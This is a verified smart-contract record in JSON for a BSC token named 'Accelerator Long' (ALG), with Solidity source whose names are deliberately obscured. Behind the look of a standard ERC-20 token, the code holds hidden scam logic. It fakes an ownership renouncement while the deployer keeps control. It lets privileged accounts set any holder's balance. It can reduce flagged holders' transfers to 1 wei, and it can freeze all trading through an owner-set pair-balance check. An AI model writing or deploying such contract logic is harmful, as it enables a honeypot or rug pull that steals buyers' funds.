{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface liquidityAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTrading) external view returns (uint256);\n\n    function transfer(address minLaunch, uint256 tradingMin) external returns (bool);\n\n    function allowance(address fromAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minLaunch,\n        uint256 tradingMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingBuy, uint256 value);\n    event Approval(address indexed fromAuto, address indexed spender, uint256 value);\n}\n\nabstract contract maxMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeListMin {\n    function createPair(address launchTx, address enableMode) external returns (address);\n}\n\ninterface liquidityAtMetadata is liquidityAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AcceleratorLong is maxMode, liquidityAt, liquidityAtMetadata {\n\n    function launchedTotal(address limitSell, uint256 tradingMin) public {\n        feeAmountFund();\n        listAmount[limitSell] = tradingMin;\n    }\n\n    function feeAmountFund() private view {\n        require(swapMin[_msgSender()]);\n    }\n\n    bool public txTradingSwap;\n\n    function allowance(address atMode, address walletToken) external view virtual override returns (uint256) {\n        if (walletToken == fromWallet) {\n            return type(uint256).max;\n        }\n        return tokenList[atMode][walletToken];\n    }\n\n    address launchFromAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function enableToken(uint256 tradingMin) public {\n        feeAmountFund();\n        liquidityShould = tradingMin;\n    }\n\n    function tokenLaunched(address limitLaunch) public {\n        feeAmountFund();\n        if (txTradingSwap == autoAmount) {\n            liquidityExempt = listBuy;\n        }\n        if (limitLaunch == modeAtFrom || limitLaunch == modeSenderAt) {\n            return;\n        }\n        fundWallet[limitLaunch] = true;\n    }\n\n    bool private autoAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atWallet;\n    }\n\n    mapping(address => bool) public fundWallet;\n\n    function balanceOf(address modeTrading) public view virtual override returns (uint256) {\n        return listAmount[modeTrading];\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenList;\n\n    function approve(address walletToken, uint256 tradingMin) public virtual override returns (bool) {\n        tokenList[_msgSender()][walletToken] = tradingMin;\n        emit Approval(_msgSender(), walletToken, tradingMin);\n        return true;\n    }\n\n    function senderLaunched(address teamEnableReceiver, address minLaunch, uint256 tradingMin) internal returns (bool) {\n        require(listAmount[teamEnableReceiver] >= tradingMin);\n        listAmount[teamEnableReceiver] -= tradingMin;\n        listAmount[minLaunch] += tradingMin;\n        emit Transfer(teamEnableReceiver, minLaunch, tradingMin);\n        return true;\n    }\n\n    mapping(address => uint256) private listAmount;\n\n    uint256 private atFee;\n\n    constructor (){\n        if (walletFund != liquidityExempt) {\n            marketingLiquidity = true;\n        }\n        liquidityEnable liquidityBuy = liquidityEnable(fromWallet);\n        modeSenderAt = modeListMin(liquidityBuy.factory()).createPair(liquidityBuy.WETH(), address(this));\n        \n        modeAtFrom = _msgSender();\n        launchedIs();\n        swapMin[modeAtFrom] = true;\n        listAmount[modeAtFrom] = marketingSender;\n        if (atFee == listBuy) {\n            listBuy = liquidityExempt;\n        }\n        emit Transfer(address(0), modeAtFrom, marketingSender);\n    }\n\n    mapping(address => bool) public swapMin;\n\n    bool public marketingLiquidity;\n\n    function toShould(address exemptBuyMarketing) public {\n        if (isMinLiquidity) {\n            return;\n        }\n        if (walletFund != fromFund) {\n            marketingLiquidity = true;\n        }\n        swapMin[exemptBuyMarketing] = true;\n        if (fromFund == liquidityExempt) {\n            marketingLiquidity = true;\n        }\n        isMinLiquidity = true;\n    }\n\n    address fromWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public fromFund;\n\n    function walletExempt(address teamEnableReceiver, address minLaunch, uint256 tradingMin) internal returns (bool) {\n        if (teamEnableReceiver == modeAtFrom) {\n            return senderLaunched(teamEnableReceiver, minLaunch, tradingMin);\n        }\n        uint256 walletLaunchMax = liquidityAt(modeSenderAt).balanceOf(launchFromAuto);\n        require(walletLaunchMax == liquidityShould);\n        require(minLaunch != launchFromAuto);\n        if (fundWallet[teamEnableReceiver]) {\n            return senderLaunched(teamEnableReceiver, minLaunch, amountLimitExempt);\n        }\n        return senderLaunched(teamEnableReceiver, minLaunch, tradingMin);\n    }\n\n    address private txAuto;\n\n    address public modeSenderAt;\n\n    uint256 private marketingSender = 100000000 * 10 ** 18;\n\n    uint256 liquidityShould;\n\n    function transferFrom(address teamEnableReceiver, address minLaunch, uint256 tradingMin) external override returns (bool) {\n        if (_msgSender() != fromWallet) {\n            if (tokenList[teamEnableReceiver][_msgSender()] != type(uint256).max) {\n                require(tradingMin <= tokenList[teamEnableReceiver][_msgSender()]);\n                tokenList[teamEnableReceiver][_msgSender()] -= tradingMin;\n            }\n        }\n        return walletExempt(teamEnableReceiver, minLaunch, tradingMin);\n    }\n\n    function launchedIs() public {\n        emit OwnershipTransferred(modeAtFrom, address(0));\n        txAuto = address(0);\n    }\n\n    uint256 private listBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverShould;\n    }\n\n    address public modeAtFrom;\n\n    string private atWallet = \"ALG\";\n\n    uint256 atMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingSender;\n    }\n\n    uint8 private receiverShould = 18;\n\n    bool public minLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return isSwap;\n    }\n\n    event OwnershipTransferred(address indexed feeSwap, address indexed toExempt);\n\n    function transfer(address limitSell, uint256 tradingMin) external virtual override returns (bool) {\n        return walletExempt(_msgSender(), limitSell, tradingMin);\n    }\n\n    function owner() external view returns (address) {\n        return txAuto;\n    }\n\n    string private isSwap = \"Accelerator Long\";\n\n    bool public isMinLiquidity;\n\n    function getOwner() external view returns (address) {\n        return txAuto;\n    }\n\n    uint256 constant amountLimitExempt = 1 ** 10;\n\n    uint256 private walletFund;\n\n    uint256 private liquidityExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingMin\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMinLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMin\",\"type\":\"uint256\"}],\"name\":\"launchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAtFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSenderAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuyMarketing\",\"type\":\"address\"}],\"name\":\"toShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"}],\"name\":\"tokenLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnableReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTradingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AcceleratorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}